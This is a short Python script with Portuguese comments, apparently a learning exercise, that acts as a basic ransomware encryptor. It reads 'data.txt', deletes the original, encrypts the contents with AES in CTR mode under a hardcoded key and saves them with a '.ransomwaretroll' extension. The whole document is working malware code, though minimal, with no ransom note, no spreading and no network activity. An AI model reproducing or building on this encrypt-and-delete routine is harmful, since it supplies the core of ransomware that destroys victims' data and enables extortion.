import os
import pyaes

## abre o arquivo a ser criptografado
file_name = "data.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## remove o arquivo original
os.remove(file_name)

## chave de criptografia com 16 caracteres
key = b"t35t3r4n50mw4r35"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografa o arquivo
crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
